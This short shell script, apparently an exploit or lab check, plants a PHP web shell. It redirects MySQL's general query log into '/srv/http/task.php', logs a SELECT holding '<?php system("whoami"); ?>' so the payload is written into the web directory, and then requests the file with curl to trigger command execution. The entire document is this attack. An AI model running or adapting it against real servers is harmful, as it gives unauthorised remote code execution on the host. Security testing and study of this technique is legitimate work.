#!/bin/sh
mysql <<'QUERY'
SET @@global.general_log_file = '/srv/http/task.php';
SET @@global.general_log = 'ON';
SELECT '<?php system("whoami"); ?>';
SET @@global.general_log = OFF;
QUERY
curl --fail "$SITE/task.php"
